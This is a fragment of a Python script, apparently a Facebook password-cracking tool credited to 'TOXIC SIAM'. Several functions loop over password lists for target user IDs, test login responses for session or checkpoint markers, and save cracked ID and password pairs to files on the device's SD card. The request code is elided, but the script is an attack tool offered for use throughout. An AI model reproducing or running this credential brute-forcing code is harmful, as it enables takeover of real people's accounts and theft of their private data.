...
{W}[{G}+{W}]---------------------------------------------- 
{W}[{G}+{W}] CREATED BY   :  \x1b[1;97mTOXIC SIAM
{W}[{G}+{W}] ON FACEBOK   :  \x1b[1;97mMR-SIAM
{W}[{G}+{W}] ON GITHUB    :  \x1b[1;97mMR_SIAM
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Sk:
                                ...
                                print('\r\r\033[1;32m MR-SIAM-OK %s | %s'%(ids,pas))
                                open('/sdcard/MR-SIAM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Sk:
                                if 'y' in pcp:
                                        print('\r\033[1;91m MR-SIAM-CP '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-SIAM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m MR-SIAM-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-SIAM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def api1(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32mMR-SIAM-OK '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MR-SIAM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/MR-SIAM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m MR-SIAM-OK '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/MR-SIAM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32mMR-SIAM-OK '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/MR-SIAM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
